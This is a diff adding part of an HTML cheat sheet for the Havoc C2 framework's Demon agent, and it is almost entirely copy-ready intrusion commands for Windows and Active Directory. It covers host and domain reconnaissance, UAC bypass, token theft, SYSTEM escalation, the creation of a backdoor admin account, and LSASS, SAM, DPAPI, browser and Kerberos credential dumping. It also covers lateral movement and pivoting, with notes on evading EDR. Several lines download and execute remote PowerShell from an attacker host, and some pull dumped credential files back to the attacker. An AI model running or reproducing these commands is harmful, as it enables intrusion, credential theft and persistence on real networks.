+          <div class="alert opsec">🛡️&nbsp; Run Seatbelt via <code>dotnet inline-execute</code> — executes entirely in memory, no file dropped on disk.</div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Seatbelt modules via Demon</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Full host recon (all checks)</span>
+dotnet inline-execute /opt/Seatbelt.exe -group=all
+
+<span class="cm"># System basics</span>
+dotnet inline-execute /opt/Seatbelt.exe OSInfo EnvironmentPath PowerShell
+
+<span class="cm"># Credential hunting (HIGH VALUE)</span>
+dotnet inline-execute /opt/Seatbelt.exe WindowsCredentialFiles \
+  CredEnum ChromiumPresence ChromiumBookmarks FirefoxPresence \
+  MasterKeys RDCManFiles KeePass
+
+<span class="cm"># Network + firewall</span>
+dotnet inline-execute /opt/Seatbelt.exe NetworkInterfaces \
+  NetworkShares TcpConnections UdpConnections FirewallRules DNSCache
+
+<span class="cm"># AV / security products</span>
+dotnet inline-execute /opt/Seatbelt.exe AntiVirus WindowsDefender \
+  AMSIProviders WEF
+
+<span class="cm"># Scheduled tasks + services (persistence check)</span>
+dotnet inline-execute /opt/Seatbelt.exe ScheduledTasks \
+  NonstandardServices InterestingProcesses
+
+<span class="cm"># Domain-specific checks</span>
+dotnet inline-execute /opt/Seatbelt.exe DomainGroups \
+  DomainSharks DomainUsers GPODelegations
+
+<span class="cm"># Interesting files</span>
+dotnet inline-execute /opt/Seatbelt.exe InterestingFiles \
+  PowerShellHistory WindowsEventForwarding</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">2.2</span>
+          <span class="cc-title">Local System Enumeration</span>
+          <span class="cc-tags"><span class="tag enum">enum</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Shell commands from Demon Console</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># OS and patch level</span>
+shell wmic os get Caption,Version,BuildNumber,OSArchitecture
+shell wmic qfe list brief | sort /r  <span class="cm"># Missing patches</span>
+
+<span class="cm"># Local users + admins</span>
+shell net localgroup administrators
+shell net user
+shell wmic useraccount list full
+
+<span class="cm"># Installed software (for local privesc)</span>
+shell wmic product get Name,Version | sort
+shell reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr DisplayName
+
+<span class="cm"># Running services</span>
+shell sc query type= all state= running
+shell wmic service get Name,PathName,StartMode,State | findstr -i "auto"
+
+<span class="cm"># Scheduled tasks</span>
+shell schtasks /query /fo LIST /v | findstr /B /C:"Task Name" /C:"Run As User" /C:"Next Run Time"
+
+<span class="cm"># Open ports + connections</span>
+shell netstat -ano
+shell netstat -ano | findstr ESTABLISHED
+
+<span class="cm"># Drives and shares</span>
+shell net share
+shell wmic logicaldisk get DeviceID,DriveType,FreeSpace,Size
+
+<span class="cm"># Registry autoruns</span>
+shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+shell reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">2.3</span>
+          <span class="cc-title">Domain Enumeration via Demon</span>
+          <span class="cc-tags"><span class="tag enum">AD</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Domain recon from inside a Demon session</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Domain basics</span>
+shell nltest /domain_trusts
+shell nltest /dsgetdc:<span class="va">DOMAIN</span>
+shell net view /domain
+
+<span class="cm"># Domain users</span>
+shell net user /domain
+shell wmic /NAMESPACE:"\\root\directory\ldap" PATH ds_user GET ds_samaccountname
+
+<span class="cm"># Domain groups</span>
+shell net group "Domain Admins" /domain
+shell net group "Enterprise Admins" /domain
+shell net group "Schema Admins" /domain
+shell net group "Account Operators" /domain
+shell net group "Backup Operators" /domain
+
+<span class="cm"># Domain computers</span>
+shell net view /domain:<span class="va">DOMAIN</span>
+shell nltest /dclist:<span class="va">DOMAIN</span>
+
+<span class="cm"># GPO list</span>
+shell gpresult /r
+shell gpresult /H C:\Windows\Temp\gpo.html /F
+
+<span class="cm"># Logged on users (find DA sessions)</span>
+shell qwinsta /server:<span class="va">TARGET</span>
+shell query session /server:<span class="va">TARGET</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">2.4</span>
+          <span class="cc-title">PowerView via Demon (In-Memory)</span>
+          <span class="cc-tags"><span class="tag enum">AD</span><span class="tag opsec">in-memory</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Load PowerView in-memory + key queries</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Load PowerView fileless (serve from your HTTP server)</span>
+powershell IEX(New-Object Net.WebClient).DownloadString('http://<span class="va">LHOST</span>/PowerView.ps1')
+
+<span class="cm"># OR via Demon upload + execute:</span>
+upload /opt/PowerView.ps1 C:\Windows\Temp\pv.ps1
+powershell -ep bypass -c "Import-Module C:\Windows\Temp\pv.ps1; Get-NetDomain"
+
+<span class="cm"># Key queries (run as powershell commands):</span>
+powershell Get-NetDomain
+powershell Get-NetDomainController
+powershell Get-NetUser | select samaccountname,description,pwdlastset
+powershell Get-NetUser -SPN                    <span class="cm"># Kerberoastable</span>
+powershell Get-NetUser -PreauthNotRequired     <span class="cm"># AS-REP roastable</span>
+powershell Get-NetComputer -Unconstrained | select dnshostname
+powershell Find-LocalAdminAccess -Verbose      <span class="cm"># Where are you local admin?</span>
+powershell Invoke-UserHunter -Stealth          <span class="cm"># Find DA sessions</span>
+powershell Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {`
+  $_.IdentityReferenceName -notmatch "NT AUTHORITY|BUILTIN" }</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">2.5</span>
+          <span class="cc-title">SharpHound via Demon</span>
+          <span class="cc-tags"><span class="tag enum">BloodHound</span><span class="tag opsec">in-memory</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Run SharpHound collection from Demon</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Method 1: Inline-execute (in-memory, preferred)</span>
+dotnet inline-execute /opt/SharpHound.exe -c All --zipfilename bh.zip --outputdirectory C:\Windows\Temp\
+
+<span class="cm"># Method 2: Upload + execute (leaves artifact)</span>
+upload /opt/SharpHound.exe C:\Windows\Temp\sh.exe
+shell C:\Windows\Temp\sh.exe -c All --zipfilename bh.zip
+
+<span class="cm"># Download ZIP back to teamserver</span>
+download C:\Windows\Temp\bh.zip
+
+<span class="cm"># Method 3: PowerShell fileless</span>
+powershell IEX(New-Object Net.WebClient).DownloadString('http://<span class="va">LHOST</span>/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All
+
+<span class="cm"># Stealth collection (less LDAP noise):</span>
+dotnet inline-execute /opt/SharpHound.exe -c DCOnly --ldapusername '<span class="va">user</span>' --ldappassword '<span class="va">pass</span>'</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s2 -->
+
+  <!-- ═══════════════ PHASE 3: TOKEN & PRIVILEGE ═══════════════ -->
+  <div class="phase" id="s3">
+    <div class="phase-hdr" style="border-left-color:#f9c74f;background:linear-gradient(90deg,rgba(249,199,79,.06),var(--surf))">
+      <span class="ph-num">PHASE 03</span>
+      <span class="ph-title" style="color:#f9c74f">Token Manipulation &amp; Privilege Escalation</span>
+      <span class="ph-badge" style="color:#f9c74f">PRIVESC</span>
+    </div>
+    <div class="ph-desc">Elevate from Medium to High integrity, escalate to SYSTEM, steal tokens from privileged processes, and impersonate other users.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">3.1</span>
+          <span class="cc-title">UAC Bypass → High Integrity</span>
+          <span class="cc-tags"><span class="tag priv">privesc</span><span class="tag evasion">evasion</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="opsec-row">
+            <span class="opsec-label">OPSEC:</span>
+            <div class="opsec-dots">
+              <div class="opsec-dot on g"></div><div class="opsec-dot on g"></div>
+              <div class="opsec-dot on y"></div><div class="opsec-dot"></div><div class="opsec-dot"></div>
+            </div>
+            <span class="opsec-text" style="color:var(--yellow)">MODERATE — logged in Security event log</span>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">UAC bypass techniques from Demon</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Check current integrity level</span>
+token whoami
+shell whoami /groups | findstr "Mandatory Label"
+
+<span class="cm"># Method 1: fodhelper (no disk artifact, reliable W10/W11)</span>
+shell reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd /c start C:\Windows\Temp\demon.exe" /f
+shell reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f
+shell C:\Windows\System32\fodhelper.exe
+
+<span class="cm"># Method 2: eventvwr (classic, W7-W10)</span>
+shell reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Windows\Temp\demon.exe" /f
+shell eventvwr.exe
+
+<span class="cm"># Method 3: via Havoc module (if available)</span>
+privesc uac-bypass fodhelper
+
+<span class="cm"># Cleanup reg keys after elevation:</span>
+shell reg delete HKCU\Software\Classes\ms-settings /f
+shell reg delete "HKCU\Software\Classes\mscfile" /f</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">3.2</span>
+          <span class="cc-title">Token Impersonation &amp; Steal</span>
+          <span class="cc-tags"><span class="tag priv">privesc</span><span class="tag creds">tokens</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="opsec-row">
+            <span class="opsec-label">OPSEC:</span>
+            <div class="opsec-dots">
+              <div class="opsec-dot on g"></div><div class="opsec-dot on g"></div>
+              <div class="opsec-dot on g"></div><div class="opsec-dot on y"></div><div class="opsec-dot"></div>
+            </div>
+            <span class="opsec-text" style="color:var(--green)">LOW — no new process, token swap only</span>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Token steal + impersonation (Demon native)</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># List processes with their token user</span>
+ps
+
+<span class="cm"># Steal token from a privileged process (SYSTEM or DA user)</span>
+token steal <span class="va">TARGET_PID</span>
+
+<span class="cm"># Verify impersonation</span>
+token whoami
+
+<span class="cm"># Use impersonated token for a command</span>
+token impersonate <span class="va">TARGET_PID</span>
+shell whoami
+shell klist
+
+<span class="cm"># Make token from credentials (no process needed)</span>
+token make <span class="va">DOMAIN</span>\<span class="va">username</span> <span class="va">password</span> <span class="va">DOMAIN</span>
+
+<span class="cm"># Revert to original token</span>
+token revert
+
+<span class="cm"># List all available tokens on system</span>
+token list
+
+<span class="cm"># Good targets for token steal:</span>
+<span class="cm"># SYSTEM: lsass.exe, services.exe, svchost.exe (SYSTEM)</span>
+<span class="cm"># DA: any process owned by a DA user currently logged in</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">3.3</span>
+          <span class="cc-title">GetSYSTEM — Escalate to SYSTEM</span>
+          <span class="cc-tags"><span class="tag priv">SYSTEM</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Escalate to SYSTEM from High integrity</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Requires High integrity (admin token)</span>
+<span class="cm"># Method 1: Named pipe impersonation (classic, very reliable)</span>
+getsystem namedpipe
+
+<span class="cm"># Method 2: Token duplication from SYSTEM process</span>
+token steal <span class="hl">$(ps | grep lsass | awk '{print $1}')</span>
+<span class="cm"># Or manually — find lsass PID from 'ps', then:</span>
+token steal <span class="va">LSASS_PID</span>
+
+<span class="cm"># Method 3: Service impersonation</span>
+getsystem service
+
+<span class="cm"># Verify</span>
+getuid
+<span class="cm"># Should show: NT AUTHORITY\SYSTEM</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">3.4</span>
+          <span class="cc-title">Local Privilege Escalation (SharpUp)</span>
+          <span class="cc-tags"><span class="tag priv">privesc</span><span class="tag enum">audit</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">SharpUp — automated local privesc audit</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Full audit (in-memory)</span>
+dotnet inline-execute /opt/SharpUp.exe audit
+
+<span class="cm"># Individual checks:</span>
+dotnet inline-execute /opt/SharpUp.exe AlwaysInstallElevated
+dotnet inline-execute /opt/SharpUp.exe UnquotedServicePath
+dotnet inline-execute /opt/SharpUp.exe ModifiableServiceBinaries
+dotnet inline-execute /opt/SharpUp.exe ModifiableServices
+dotnet inline-execute /opt/SharpUp.exe TokenPrivileges        <span class="cm"># SeImpersonate etc.</span>
+dotnet inline-execute /opt/SharpUp.exe DPAPICredFiles
+
+<span class="cm"># Common quick wins from SharpUp output:</span>
+<span class="cm"># Unquoted Service Path → drop exe in path gap → restart service</span>
+<span class="cm"># Weak Service ACL → change binpath → restart service</span>
+<span class="cm"># SeImpersonatePrivilege → PrintSpoofer / GodPotato</span>
+<span class="cm"># AlwaysInstallElevated → craft malicious .msi → msiexec</span>
+
+<span class="cm"># SeImpersonate → SYSTEM via GodPotato:</span>
+upload /opt/GodPotato.exe C:\Windows\Temp\gp.exe
+shell C:\Windows\Temp\gp.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s3 -->
+
+  <!-- ═══════════════ PHASE 4: CREDENTIAL ACCESS ═══════════════ -->
+  <div class="phase" id="s4">
+    <div class="phase-hdr" style="border-left-color:#b05cf7;background:linear-gradient(90deg,rgba(176,92,247,.06),var(--surf))">
+      <span class="ph-num">PHASE 04</span>
+      <span class="ph-title" style="color:#b05cf7">Credential Access</span>
+      <span class="ph-badge" style="color:#b05cf7">CREDS</span>
+    </div>
+    <div class="ph-desc">Dump credentials from memory, registry, disk, and browser stores. All dumping done in-memory where possible to avoid AV/EDR detection.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">4.1</span>
+          <span class="cc-title">LSASS Dump (In-Memory)</span>
+          <span class="cc-tags"><span class="tag creds">NTLM</span><span class="tag opsec">in-memory</span><span class="tag priv">SYSTEM req</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="opsec-row">
+            <span class="opsec-label">OPSEC:</span>
+            <div class="opsec-dots">
+              <div class="opsec-dot on r"></div><div class="opsec-dot on r"></div>
+              <div class="opsec-dot on r"></div><div class="opsec-dot on y"></div><div class="opsec-dot"></div>
+            </div>
+            <span class="opsec-text" style="color:var(--red)">HIGH RISK — lsass reads are heavily monitored by EDR</span>
+          </div>
+          <div class="alert danger">⛔&nbsp; Direct lsass.exe access is caught by most EDRs. Use indirect/reflective methods. Nanodump is preferred over Mimikatz for modern environments.</div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Nanodump — stealthy LSASS dump (Demon inline)</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Nanodump: reflective, avoids common EDR hooks</span>
+<span class="cm"># Clone: https://github.com/helpsystems/nanodump</span>
+dotnet inline-execute /opt/nanodump.exe --write C:\Windows\Temp\nd.dmp
+
+<span class="cm"># Or via Havoc's built-in (if module loaded):</span>
+cred dump
+
+<span class="cm"># Alternative: Mimikatz in-memory via Demon</span>
+dotnet inline-execute /opt/Invoke-Mimikatz.exe sekurlsa::logonpasswords
+
+<span class="cm"># Parse dump offline on attacker box:</span>
+pypykatz lsa minidump nd.dmp | tee creds_parsed.txt
+pypykatz lsa minidump nd.dmp --json | jq '.[] | .msv_creds'</pre>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Mimikatz commands via Demon Console</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Load Mimikatz in-memory via powershell module</span>
+powershell IEX(New-Object Net.WebClient).DownloadString('http://<span class="va">LHOST</span>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
+
+<span class="cm"># Specific Mimikatz commands (via powershell or dotnet):</span>
+<span class="cm"># Logon passwords (cleartext if WDigest enabled)</span>
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+
+<span class="cm"># NTLM hashes only (safer, less likely to be cleartext)</span>
+Invoke-Mimikatz -Command '"sekurlsa::msv"'
+
+<span class="cm"># Kerberos tickets in memory</span>
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+<span class="cm"># SAM hive</span>
+Invoke-Mimikatz -Command '"lsadump::sam"'
+
+<span class="cm"># DCSync (if you have DA or replication rights)</span>
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<span class="va">DOMAIN</span> /user:krbtgt"'</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">4.2</span>
+          <span class="cc-title">SAM &amp; Registry Credential Dump</span>
+          <span class="cc-tags"><span class="tag creds">hashes</span><span class="tag priv">SYSTEM req</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="opsec-row">
+            <span class="opsec-label">OPSEC:</span>
+            <div class="opsec-dots">
+              <div class="opsec-dot on g"></div><div class="opsec-dot on g"></div>
+              <div class="opsec-dot on y"></div><div class="opsec-dot"></div><div class="opsec-dot"></div>
+            </div>
+            <span class="opsec-text" style="color:var(--yellow)">MODERATE — registry access, not lsass</span>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">SAM/SYSTEM/SECURITY hive dump</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Save hives (requires SYSTEM or admin)</span>
+shell reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+shell reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+shell reg save HKLM\SECURITY C:\Windows\Temp\sec.hiv
+
+<span class="cm"># Download to attacker</span>
+download C:\Windows\Temp\sam.hiv
+download C:\Windows\Temp\sys.hiv
+download C:\Windows\Temp\sec.hiv
+
+<span class="cm"># Parse on attacker (secretsdump offline)</span>
+secretsdump.py LOCAL -sam sam.hiv -system sys.hiv -security sec.hiv
+
+<span class="cm"># LSA secrets (service account plaintext passwords)</span>
+dotnet inline-execute /opt/SharpDPAPI.exe machinecredentials
+dotnet inline-execute /opt/SharpDPAPI.exe machinemasterkeys
+
+<span class="cm"># Cleanup</span>
+shell del /f /q C:\Windows\Temp\sam.hiv C:\Windows\Temp\sys.hiv C:\Windows\Temp\sec.hiv</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">4.3</span>
+          <span class="cc-title">DPAPI — Browser &amp; Credential Store</span>
+          <span class="cc-tags"><span class="tag creds">DPAPI</span><span class="tag opsec">stealth</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="opsec-row">
+            <span class="opsec-label">OPSEC:</span>
+            <div class="opsec-dots">
+              <div class="opsec-dot on g"></div><div class="opsec-dot on g"></div>
+              <div class="opsec-dot on g"></div><div class="opsec-dot on g"></div><div class="opsec-dot"></div>
+            </div>
+            <span class="opsec-text" style="color:var(--green)">LOW — no lsass access required</span>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">SharpDPAPI — decrypt DPAPI secrets</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># User DPAPI credentials (user context)</span>
+dotnet inline-execute /opt/SharpDPAPI.exe credentials
+dotnet inline-execute /opt/SharpDPAPI.exe vaults
+dotnet inline-execute /opt/SharpDPAPI.exe rdg          <span class="cm"># RDCManager files</span>
+
+<span class="cm"># Browser credentials (Chrome/Edge/Firefox)</span>
+dotnet inline-execute /opt/SharpChrome.exe logins       <span class="cm"># Chrome saved passwords</span>
+dotnet inline-execute /opt/SharpChrome.exe cookies      <span class="cm"># Chrome cookies (for session hijack)</span>
+
+<span class="cm"># KeePass database hunting</span>
+dotnet inline-execute /opt/Seatbelt.exe KeePass
+shell dir /s /b C:\Users\*.kdbx 2>nul
+shell dir /s /b C:\Users\*.kp 2>nul
+
+<span class="cm"># Windows Credential Manager</span>
+dotnet inline-execute /opt/Seatbelt.exe WindowsCredentialFiles
+shell cmdkey /list
+
+<span class="cm"># WiFi passwords</span>
+shell netsh wlan show profile name=* key=clear 2>nul | findstr "Key Content"</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">4.4</span>
+          <span class="cc-title">Kerberos Ticket Operations</span>
+          <span class="cc-tags"><span class="tag creds">Kerberos</span><span class="tag lateral">PTT</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Rubeus via Demon — ticket operations</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># List current tickets in memory</span>
+dotnet inline-execute /opt/Rubeus.exe triage
+
+<span class="cm"># Dump all tickets (base64)</span>
+dotnet inline-execute /opt/Rubeus.exe dump /nowrap
+
+<span class="cm"># Dump specific user's tickets</span>
+dotnet inline-execute /opt/Rubeus.exe dump /user:<span class="va">administrator</span> /nowrap
+
+<span class="cm"># AS-REP Roast from Demon</span>
+dotnet inline-execute /opt/Rubeus.exe asreproast /format:hashcat /nowrap
+
+<span class="cm"># Kerberoast from Demon</span>
+dotnet inline-execute /opt/Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:krb.txt
+
+<span class="cm"># Pass the Ticket — inject ticket into session</span>
+dotnet inline-execute /opt/Rubeus.exe ptt /ticket:<span class="va">BASE64_TICKET</span>
+
+<span class="cm"># Request TGT for user (if you have creds)</span>
+dotnet inline-execute /opt/Rubeus.exe asktgt /user:<span class="va">admin</span> /password:<span class="va">Pass123!</span> /domain:<span class="va">DOMAIN</span> /ptt /nowrap
+
+<span class="cm"># Overpass-the-Hash (NTLM hash → Kerberos TGT)</span>
+dotnet inline-execute /opt/Rubeus.exe asktgt /user:<span class="va">admin</span> /rc4:<span class="va">NTLM_HASH</span> /domain:<span class="va">DOMAIN</span> /ptt /nowrap
+
+<span class="cm"># Monitor for incoming tickets (unconstrained deleg host)</span>
+dotnet inline-execute /opt/Rubeus.exe monitor /interval:5 /nowrap</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s4 -->
+
+  <!-- ═══════════════ PHASE 5: LATERAL MOVEMENT ═══════════════ -->
+  <div class="phase" id="s5">
+    <div class="phase-hdr" style="border-left-color:#f4730e;background:linear-gradient(90deg,rgba(244,115,14,.06),var(--surf))">
+      <span class="ph-num">PHASE 05</span>
+      <span class="ph-title" style="color:#f4730e">Lateral Movement</span>
+      <span class="ph-badge" style="color:#f4730e">LATERAL</span>
+    </div>
+    <div class="ph-desc">Spawn new Demon sessions on remote hosts using stolen credentials, tokens, or Kerberos tickets. Chain sessions via SMB listeners for internal pivoting.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">5.1</span>
+          <span class="cc-title">Lateral Movement via Demon</span>
+          <span class="cc-tags"><span class="tag lateral">WMI</span><span class="tag lateral">SMB</span><span class="tag lateral">PSExec</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Spawn Demon on remote host</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Method 1: WMI (quiet, no service install)</span>
+lateral-move wmi <span class="va">TARGET_IP</span> <span class="va">DOMAIN</span>\<span class="va">Administrator</span> <span class="va">Password1!</span>
+
+<span class="cm"># Method 2: PSExec (noisy, SYSTEM context)</span>
+lateral-move psexec <span class="va">TARGET_IP</span> <span class="va">DOMAIN</span>\<span class="va">Administrator</span> <span class="va">Password1!</span>
+
+<span class="cm"># Method 3: WinRM</span>
+lateral-move winrm <span class="va">TARGET_IP</span> <span class="va">DOMAIN</span>\<span class="va">Administrator</span> <span class="va">Password1!</span>
+
+<span class="cm"># Method 4: Token-based (steal token first, then move)</span>
+token steal <span class="va">DA_PROCESS_PID</span>
+lateral-move wmi <span class="va">TARGET_IP</span>
+
+<span class="cm"># Method 5: SMB listener (peer-to-peer, no internet needed)</span>
+<span class="cm"># On TARGET: drop demon_smb payload, execute it</span>
+upload /opt/demon_smb.exe C:\Windows\Temp\svc.exe
+shell C:\Windows\Temp\svc.exe
+<span class="cm"># Back on teamserver — link the new SMB demon:</span>
+pivot link <span class="va">TARGET_IP</span> \\.\pipe\havoc_smb</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">5.2</span>
+          <span class="cc-title">Remote Execution via Shell</span>
+          <span class="cc-tags"><span class="tag lateral">execution</span><span class="tag opsec">LOLBins</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Execute commands on remote hosts</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># WMI process create (stealthy, no auth dialog)</span>
+shell wmic /node:<span class="va">TARGET_IP</span> /user:"<span class="va">DOMAIN</span>\<span class="va">admin</span>" /password:"<span class="va">Pass1!</span>" process call create "cmd /c whoami > C:\Windows\Temp\out.txt"
+shell type \\<span class="va">TARGET_IP</span>\C$\Windows\Temp\out.txt
+
+<span class="cm"># PsExec (impacket-style via shell)</span>
+shell cmd /c echo . | psexec.exe \\<span class="va">TARGET_IP</span> -u <span class="va">DOMAIN</span>\<span class="va">admin</span> -p <span class="va">Pass1!</span> cmd
+
+<span class="cm"># Scheduled task (persistent execution)</span>
+shell schtasks /create /s <span class="va">TARGET_IP</span> /u <span class="va">DOMAIN</span>\<span class="va">admin</span> /p <span class="va">Pass1!</span> /tn "update" /tr "C:\Windows\Temp\demon.exe" /sc once /st 00:00 /f
+shell schtasks /run /s <span class="va">TARGET_IP</span> /u <span class="va">DOMAIN</span>\<span class="va">admin</span> /p <span class="va">Pass1!</span> /tn "update"
+
+<span class="cm"># Copy + execute via admin share</span>
+shell copy C:\Windows\Temp\demon.exe \\<span class="va">TARGET_IP</span>\ADMIN$\demon.exe
+shell wmic /node:<span class="va">TARGET_IP</span> process call create "C:\Windows\demon.exe"</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">5.3</span>
+          <span class="cc-title">Pivoting via SOCKS &amp; Port Forwarding</span>
+          <span class="cc-tags"><span class="tag lateral">pivot</span><span class="tag opsec">tunnel</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Havoc SOCKS5 proxy + port forwarding</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Create SOCKS5 proxy through Demon (Demon Console)</span>
+socks 1080
+<span class="cm"># Configure proxychains: socks5 127.0.0.1 1080</span>
+<span class="cm"># Then on attacker:</span>
+proxychains4 crackmapexec smb <span class="va">INTERNAL_IP</span> -u '<span class="va">user</span>' -p '<span class="va">pass</span>'
+proxychains4 nmap -sT -Pn <span class="va">INTERNAL_IP</span>
+proxychains4 evil-winrm -i <span class="va">INTERNAL_IP</span> -u admin -p '<span class="va">Pass1!</span>'
+
+<span class="cm"># Port forward (rportfwd)</span>
+rportfwd add <span class="va">LOCAL_PORT</span> <span class="va">INTERNAL_IP</span> <span class="va">REMOTE_PORT</span>
+<span class="cm"># Example: expose internal RDP to attacker:</span>
+rportfwd add 13389 <span class="va">192.168.2.50</span> 3389
+<span class="cm"># Then: xfreerdp /v:127.0.0.1:13389 ...</span>
+
+<span class="cm"># List active portfwds</span>
+rportfwd list
+
+<span class="cm"># Remove portfwd</span>
+rportfwd remove <span class="va">LOCAL_PORT</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s5 -->
+
